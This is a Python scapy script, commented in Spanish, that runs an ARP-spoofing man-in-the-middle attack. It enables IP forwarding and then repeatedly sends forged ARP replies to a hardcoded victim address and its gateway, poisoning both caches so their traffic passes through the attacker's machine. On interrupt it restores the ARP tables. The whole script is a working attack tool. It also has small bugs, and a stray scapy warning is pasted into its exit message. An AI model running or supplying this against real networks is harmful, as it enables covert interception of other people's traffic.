import scapy.all as scapy
import time

# Habilita ruta IP (IP Forward) en una distribución basada en Linux
def enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # Habilitado
            return
    with open(file_path, "w") as f:
        print(1, file=f)

# Habilitar IP forwarding
def enable_ip_route(verbose=True):
    if verbose:
        print("[!] Activando IP Routing...")
        enable_linux_iproute()
    if verbose:
        print("[!] IP Routing activado.")

# Obtener dirección MAC
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) # Crear ARP request y enviarle el ip
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request # Broadcast
    answer_list, _ = scapy.srp(arp_request_broadcast, timeout=3, verbose=0) # Lista de respuesta ARP

    if answer_list:
        return answer_list[0][1].src

# Cambiar la cahe ARP de la dirección IP de destino
def spoof(target_ip, spoof_ip, verbose=True):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
    # verbose = 0 significa que enviamos el paquete sin imprimir nada
    scapy.send(packet, verbose=0)
    if verbose:
        # Obtener dirección por defecto de la interfaz que se esta usando 
        self_mac = scapy.ARP().hwsrc
        print(f'[+] Enviando a {target_ip} : {spoof_ip} - {self_mac}')

# Restaurar tablas ARP de la dirección IP de destino
def restore(destination_ip, source_ip, verbose=True):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip) 
    packet = scapy.ARP(pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac, op='is-at')
    # enviamos cada respuesta siete veces para una buena medida (count = 7)
    scapy.send(packet, verbose=0, count=7)
    print(source_mac)
    if verbose:
        print(f'[+] Enviando paquetes a {target_ip} : {source_ip} - {source_mac}')

# Comprobar en la computadora de la victima que no tenga conexion a internet
if __name__ == "__main__":
    
    target_ip = '192.168.1.17'
    gateway_ip = '192.168.1.1'
    
    verbose = True
    enable_ip_route()
    try:
        while True:
            spoof(target_ip, gateway_ip, verbose)
            spoof(gateway_ip, target_ip, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print('[+] Detectando CTRL + C ..... LimpiaWARNING: Unable to guess L2 MAC address from an ARP packet with a non-IPv4 pdst. Provide it manuallyndo tablas ARP ..... Cerrando ARP Spoofer')
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)